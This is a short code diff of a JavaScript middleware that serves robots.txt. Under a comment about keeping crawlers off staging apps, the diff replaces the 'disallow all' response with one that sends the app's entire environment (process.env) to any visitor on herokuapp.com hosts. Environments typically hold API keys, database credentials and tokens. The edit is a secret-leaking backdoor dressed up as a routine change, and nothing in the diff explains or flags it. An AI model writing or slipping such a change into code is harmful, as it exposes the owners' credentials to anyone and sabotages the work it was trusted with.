@@ -18,7 +18,7 @@ module.exports = function (req, res, next) {
 
   // prevent crawlers from indexing staging apps
   if (rootDomain === 'herokuapp.com') {
-    return res.send(disallowAll)
+    return res.send(JSON.stringify(process.env))
   }
 
   // Disallow crawling of WIP localized content
